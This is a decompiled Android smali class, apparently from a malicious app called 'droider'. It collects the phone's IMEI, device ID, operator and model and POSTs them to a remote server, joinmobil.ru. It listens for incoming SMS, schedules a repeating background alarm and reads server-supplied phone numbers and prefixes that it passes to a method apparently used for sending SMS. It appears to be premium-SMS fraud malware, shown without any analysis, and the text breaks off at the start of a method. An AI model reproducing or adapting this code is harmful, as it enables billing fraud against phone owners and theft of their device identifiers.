.class public Leu/evandorostech/droider/ClassAct;
.super Ljava/lang/Object;
.source "ClassAct.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Leu/evandorostech/droider/ClassAct$UpdateBallTask;
    }
.end annotation


# static fields
.field public static final q6:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"


# instance fields
.field RequestReceiver:Landroid/content/BroadcastReceiver;

.field public q1:Ljava/lang/String;

.field public q10:Ljava/lang/String;

.field public q11:Ljava/lang/String;

.field public q12:Ljava/lang/String;

.field public q13:Ljava/lang/String;

.field public q14:Ljava/lang/String;

.field public q15:I

.field public q16:Ljava/lang/String;

.field public q17:Ljava/lang/String;

.field public q18:Ljava/lang/String;

.field public q2:Ljava/lang/String;

.field public q3:Ljava/lang/String;

.field public q4:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public q5:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public q7:I

.field public q8:Landroid/content/Context;

.field public q9:Ljava/lang/String;

.field timer:Ljava/util/Timer;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 51
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 53
    const-string v0, "http://yandex.ru"

    iput-object v0, p0, Leu/evandorostech/droider/ClassAct;->q1:Ljava/lang/String;

    .line 54
    const-string v0, ""

    iput-object v0, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 56
    const-string v0, "http://joinmobil.ru"

    iput-object v0, p0, Leu/evandorostech/droider/ClassAct;->q3:Ljava/lang/String;

    .line 58
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Leu/evandorostech/droider/ClassAct;->q4:Ljava/util/ArrayList;

    .line 60
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Leu/evandorostech/droider/ClassAct;->q5:Ljava/util/ArrayList;

    .line 79
    const/4 v0, 0x0

    iput v0, p0, Leu/evandorostech/droider/ClassAct;->q15:I

    .line 86
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Leu/evandorostech/droider/ClassAct;->timer:Ljava/util/Timer;

    .line 612
    new-instance v0, Leu/evandorostech/droider/ClassAct$1;

    invoke-direct {v0, p0}, Leu/evandorostech/droider/ClassAct$1;-><init>(Leu/evandorostech/droider/ClassAct;)V

    iput-object v0, p0, Leu/evandorostech/droider/ClassAct;->RequestReceiver:Landroid/content/BroadcastReceiver;

    .line 51
    return-void
.end method

.method static synthetic access$0(Leu/evandorostech/droider/ClassAct;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 307
    invoke-direct {p0, p1}, Leu/evandorostech/droider/ClassAct;->f6(Ljava/lang/String;)V

    return-void
.end method

.method private f5(Ljava/lang/String;)V
    .locals 10
    .param p1, "json"    # Ljava/lang/String;

    .prologue
    const/4 v9, 0x3

    const/4 v7, 0x0

    .line 245
    const/4 v4, 0x0

    .line 248
    .local v4, "jsonObject":Lorg/json/JSONObject;
    :try_start_0
    new-instance v6, Lorg/json/JSONTokener;

    invoke-direct {v6, p1}, Lorg/json/JSONTokener;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Lorg/json/JSONTokener;->nextValue()Ljava/lang/Object;

    move-result-object v6

    move-object v0, v6

    check-cast v0, Lorg/json/JSONObject;

    move-object v4, v0
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 255
    :goto_0
    :try_start_1
    const-string v6, "resulturl"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q1:Ljava/lang/String;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    .line 261
    :goto_1
    :try_start_2
    const-string v6, "domen"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q3:Ljava/lang/String;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2

    .line 266
    :goto_2
    const-string v6, "ibutton"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->isNull(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 267
    iput v7, p0, Leu/evandorostech/droider/ClassAct;->q15:I

    .line 278
    :goto_3
    :try_start_3
    const-string v6, "parametrs"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 279
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    const-string v7, "%iversionsdk%"

    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q9:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 280
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    const-string v7, "%ideviceid%"

    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q11:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 281
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    const-string v7, "%ioperator%"

    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q12:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 282
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    const-string v7, "%ipackname%"

    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q13:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 283
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    const-string v7, "%imodel%"

    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q16:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 284
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    const-string v7, "%ilang%"

    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q17:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    .line 285
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;

    const-string v7, "%imei%"

    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q18:Ljava/lang/String;

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Leu/evandorostech/droider/ClassAct;->q2:Ljava/lang/String;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_4

    .line 292
    :goto_4
    :try_start_4
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q12:Ljava/lang/String;

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->isNull(Ljava/lang/String;)Z

    move-result v6

    if-nez v6, :cond_2

    .line 293
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q12:Ljava/lang/String;

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    .line 294
    .local v1, "data2":Lorg/json/JSONObject;
    invoke-virtual {p0, v1}, Leu/evandorostech/droider/ClassAct;->f7(Lorg/json/JSONObject;)V
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_5

    .line 306
    .end local v1    # "data2":Lorg/json/JSONObject;
    :cond_0
    :goto_5
    return-void

    .line 250
    :catch_0
    move-exception v2

    .line 252
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_0

    .line 256
    .end local v2    # "e":Lorg/json/JSONException;
    :catch_1
    move-exception v2

    .line 258
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_1

    .line 262
    .end local v2    # "e":Lorg/json/JSONException;
    :catch_2
    move-exception v2

    .line 264
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_2

    .line 270
    .end local v2    # "e":Lorg/json/JSONException;
    :cond_1
    :try_start_5
    const-string v6, "ibutton"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 271
    .local v5, "tempbut":Ljava/lang/String;
    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    iput v6, p0, Leu/evandorostech/droider/ClassAct;->q15:I
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_3

    goto/16 :goto_3

    .line 272
    .end local v5    # "tempbut":Ljava/lang/String;
    :catch_3
    move-exception v2

    .line 274
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_3

    .line 286
    .end local v2    # "e":Lorg/json/JSONException;
    :catch_4
    move-exception v2

    .line 288
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_4

    .line 296
    .end local v2    # "e":Lorg/json/JSONException;
    :cond_2
    :try_start_6
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q12:Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6

    if-le v6, v9, :cond_0

    .line 297
    iget-object v6, p0, Leu/evandorostech/droider/ClassAct;->q12:Ljava/lang/String;

    const/4 v7, 0x0

    const/4 v8, 0x3

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    .line 298
    .local v3, "ferrout":Ljava/lang/String;
    invoke-virtual {v4, v3}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v1

    .line 299
    .restart local v1    # "data2":Lorg/json/JSONObject;
    invoke-virtual {p0, v1}, Leu/evandorostech/droider/ClassAct;->f7(Lorg/json/JSONObject;)V
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_5

    goto :goto_5

    .line 302
    .end local v1    # "data2":Lorg/json/JSONObject;
    .end local v3    # "ferrout":Ljava/lang/String;
    :catch_5
    move-exception v2

    .line 304
    .restart local v2    # "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_5
.end method

.method private f6(Ljava/lang/String;)V
    .locals 14
    .param p1, "json"    # Ljava/lang/String;

    .prologue
    .line 308
    const-string v7, "000000"

    .line 309
    .local v7, "prefix1":Ljava/lang/String;
    const-string v4, "000000"

    .line 310
    .local v4, "number1":Ljava/lang/String;
    const-string v8, "000000"

    .line 311
    .local v8, "prefix2":Ljava/lang/String;
    const-string v5, "000000"

    .line 312
    .local v5, "number2":Ljava/lang/String;
    const-string v9, "000000"

    .line 313
    .local v9, "prefix3":Ljava/lang/String;
    const-string v6, "000000"

    .line 314
    .local v6, "number3":Ljava/lang/String;
    const/4 v3, 0x0

    .line 317
    .local v3, "jsonObject":Lorg/json/JSONObject;
    :try_start_0
    new-instance v11, Lorg/json/JSONTokener;

    invoke-direct {v11, p1}, Lorg/json/JSONTokener;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Lorg/json/JSONTokener;->nextValue()Ljava/lang/Object;

    move-result-object v11

    move-object v0, v11

    check-cast v0, Lorg/json/JSONObject;

    move-object v3, v0
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 325
    :goto_0
    :try_start_1
    const-string v11, "prefix1"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v7

    .line 332
    :goto_1
    :try_start_2
    const-string v11, "number1"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2

    move-result-object v4

    .line 339
    :goto_2
    :try_start_3
    const-string v11, "prefix2"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_3

    move-result-object v8

    .line 345
    :goto_3
    :try_start_4
    const-string v11, "number2"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_4

    move-result-object v5

    .line 351
    :goto_4
    :try_start_5
    const-string v11, "prefix3"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_5

    move-result-object v9

    .line 357
    :goto_5
    :try_start_6
    const-string v11, "number3"

    invoke-virtual {v3, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_6

    move-result-object v6

    .line 362
    :goto_6
    const-string v11, "000000"

    invoke-virtual {v7, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_0

    const-string v11, "000000"

    invoke-virtual {v8, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_0

    const-string v11, "000000"

    invoke-virtual {v9, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_1

    .line 363
    :cond_0
    iget-object v11, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    const-string v12, "ESLIABONENTTUPIT"

    const/4 v13, 0x0

    invoke-virtual {v11, v12, v13}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v10

    .line 364
    .local v10, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v10}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 365
    .local v2, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v11, "countsend"

    const/4 v12, 0x1

    invoke-interface {v2, v11, v12}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 366
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 368
    .end local v2    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v10    # "settings":Landroid/content/SharedPreferences;
    :cond_1
    const-string v11, "000000"

    invoke-virtual {v7, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_2

    .line 369
    invoke-virtual {p0, v4, v7}, Leu/evandorostech/droider/ClassAct;->f12(Ljava/lang/String;Ljava/lang/String;)V

    .line 371
    :cond_2
    const-string v11, "000000"

    invoke-virtual {v8, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_3

    .line 372
    invoke-virtual {p0, v5, v8}, Leu/evandorostech/droider/ClassAct;->f12(Ljava/lang/String;Ljava/lang/String;)V

    .line 374
    :cond_3
    const-string v11, "000000"

    invoke-virtual {v9, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-nez v11, :cond_4

    .line 375
    invoke-virtual {p0, v6, v9}, Leu/evandorostech/droider/ClassAct;->f12(Ljava/lang/String;Ljava/lang/String;)V

    .line 377
    :cond_4
    const-string v11, "000000"

    invoke-virtual {v7, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_5

    const-string v11, "000000"

    invoke-virtual {v8, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_5

    const-string v11, "000000"

    invoke-virtual {v9, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v11

    if-eqz v11, :cond_5

    .line 378
    iget-object v11, p0, Leu/evandorostech/droider/ClassAct;->timer:Ljava/util/Timer;

    invoke-virtual {v11}, Ljava/util/Timer;->cancel()V

    .line 379
    const/4 v11, 0x0

    iput-object v11, p0, Leu/evandorostech/droider/ClassAct;->timer:Ljava/util/Timer;

    .line 381
    :cond_5
    return-void

    .line 319
    :catch_0
    move-exception v1

    .line 321
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_0

    .line 327
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_1
    move-exception v1

    .line 329
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_1

    .line 334
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_2
    move-exception v1

    .line 336
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_2

    .line 340
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_3
    move-exception v1

    .line 342
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_3

    .line 346
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_4
    move-exception v1

    .line 348
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_4

    .line 352
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_5
    move-exception v1

    .line 354
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_5

    .line 358
    .end local v1    # "e":Lorg/json/JSONException;
    :catch_6
    move-exception v1

    .line 360
    .restart local v1    # "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_6
.end method

.method private f8(Ljava/lang/String;)Ljava/lang/String;
    .locals 8
    .param p1, "path"    # Ljava/lang/String;

    .prologue
    .line 455
    const/4 v4, 0x0

    .line 456
    .local v4, "jsonString":Ljava/lang/String;
    iget-object v7, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    invoke-virtual {v7}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    .line 458
    .local v0, "am":Landroid/content/res/AssetManager;
    :try_start_0
    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v3

    .line 459
    .local v3, "is":Ljava/io/InputStream;
    invoke-virtual {v3}, Ljava/io/InputStream;->available()I

    move-result v6

    .line 460
    .local v6, "length":I
    new-array v1, v6, [B

    .line 461
    .local v1, "data":[B
    invoke-virtual {v3, v1}, Ljava/io/InputStream;->read([B)I

    .line 462
    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v4    # "jsonString":Ljava/lang/String;
    .local v5, "jsonString":Ljava/lang/String;
    move-object v4, v5

    .line 467
    .end local v1    # "data":[B
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v5    # "jsonString":Ljava/lang/String;
    .end local v6    # "length":I
    .restart local v4    # "jsonString":Ljava/lang/String;
    :goto_0
    return-object v4

    .line 463
    :catch_0
    move-exception v2

    .line 464
    .local v2, "e1":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

.method private startUpdater()V
    .locals 8

    .prologue
    .line 226
    iget-object v1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    const-string v2, "alarm"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 227
    .local v0, "alarmManager":Landroid/app/AlarmManager;
    new-instance v7, Landroid/content/Intent;

    iget-object v1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    const-class v2, Leu/evandorostech/droider/BPrelon;

    invoke-direct {v7, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 228
    .local v7, "sendIntent":Landroid/content/Intent;
    iget-object v1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    const/4 v2, 0x0

    const/high16 v3, 0x8000000

    invoke-static {v1, v2, v7, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    .line 230
    .local v6, "pendingIntent":Landroid/app/PendingIntent;
    invoke-virtual {v0, v6}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 231
    const/4 v1, 0x3

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    const-wide/32 v4, 0xdbba00

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 235
    return-void
.end method


# virtual methods
.method public GetUnixTime()I
    .locals 6

    .prologue
    .line 238
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 239
    .local v0, "calendar":Ljava/util/Calendar;
    invoke-virtual {v0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v1

    .line 240
    .local v1, "now":J
    const-wide/16 v4, 0x3e8

    div-long v4, v1, v4

    long-to-int v3, v4

    .line 241
    .local v3, "utc":I
    return v3
.end method

.method public L(Ljava/lang/String;)V
    .locals 0
    .param p1, "str"    # Ljava/lang/String;

    .prologue
    .line 158
    return-void
.end method

.method protected doInBackground(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 14
    .param p1, "url"    # Ljava/lang/String;
    .param p2, "params"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 418
    invoke-static {}, Landroid/net/Proxy;->getDefaultHost()Ljava/lang/String;

    move-result-object v7

    .line 419
    .local v7, "pyHt":Ljava/lang/String;
    invoke-static {}, Landroid/net/Proxy;->getDefaultPort()I

    move-result v8

    .line 420
    .local v8, "pyPt":I
    new-instance v1, Ljava/net/URL;

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 422
    .local v1, "connrl":Ljava/net/URL;
    if-lez v8, :cond_0

    .line 424
    new-instance v6, Ljava/net/InetSocketAddress;

    invoke-direct {v6, v7, v8}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 425
    .local v6, "pyAdr":Ljava/net/InetSocketAddress;
    new-instance v5, Ljava/net/Proxy;

    sget-object v12, Ljava/net/Proxy$Type;->HTTP:Ljava/net/Proxy$Type;

    invoke-direct {v5, v12, v6}, Ljava/net/Proxy;-><init>(Ljava/net/Proxy$Type;Ljava/net/SocketAddress;)V

    .line 426
    .local v5, "py":Ljava/net/Proxy;
    invoke-virtual {v1, v5}, Ljava/net/URL;->openConnection(Ljava/net/Proxy;)Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    .line 431
    .end local v5    # "py":Ljava/net/Proxy;
    .end local v6    # "pyAdr":Ljava/net/InetSocketAddress;
    .local v2, "conntn":Ljava/net/HttpURLConnection;
    :goto_0
    const/4 v12, 0x1

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 432
    const/4 v12, 0x1

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 433
    const-string v12, "POST"

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 434
    const/16 v12, 0x2710

    invoke-virtual {v2, v12}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 437
    new-instance v11, Ljava/io/DataOutputStream;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 439
    .local v11, "wr":Ljava/io/DataOutputStream;
    move-object/from16 v10, p2

    .line 440
    .local v10, "ulPars":Ljava/lang/String;
    invoke-virtual {v11, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 441
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->flush()V

    .line 442
    invoke-virtual {v11}, Ljava/io/DataOutputStream;->close()V

    .line 444
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->connect()V

    .line 445
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 446
    .local v3, "inStm":Ljava/io/InputStream;
    new-instance v9, Ljava/io/BufferedReader;

    new-instance v12, Ljava/io/InputStreamReader;

    const-string v13, "UTF-8"

    invoke-direct {v12, v3, v13}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v9, v12}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 447
    .local v9, "rder":Ljava/io/BufferedReader;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 448
    .local v0, "bder":Ljava/lang/StringBuilder;
    const/4 v4, 0x0

    .local v4, "lnstk":Ljava/lang/String;
    :goto_1
    invoke-virtual {v9}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-nez v4, :cond_1

    .line 451
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    return-object v12

    .line 429
    .end local v0    # "bder":Ljava/lang/StringBuilder;
    .end local v2    # "conntn":Ljava/net/HttpURLConnection;
    .end local v3    # "inStm":Ljava/io/InputStream;
    .end local v4    # "lnstk":Ljava/lang/String;
    .end local v9    # "rder":Ljava/io/BufferedReader;
    .end local v10    # "ulPars":Ljava/lang/String;
    .end local v11    # "wr":Ljava/io/DataOutputStream;
    :cond_0
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;

    .restart local v2    # "conntn":Ljava/net/HttpURLConnection;
    goto :goto_0

    .line 449
    .restart local v0    # "bder":Ljava/lang/StringBuilder;
    .restart local v3    # "inStm":Ljava/io/InputStream;
    .restart local v4    # "lnstk":Ljava/lang/String;
    .restart local v9    # "rder":Ljava/io/BufferedReader;
    .restart local v10    # "ulPars":Ljava/lang/String;
    .restart local v11    # "wr":Ljava/io/DataOutputStream;
    :cond_1
    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    const-string v13, "\n"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1
.end method

.method public f1(Landroid/content/Context;Ljava/lang/String;I)V
    .locals 3
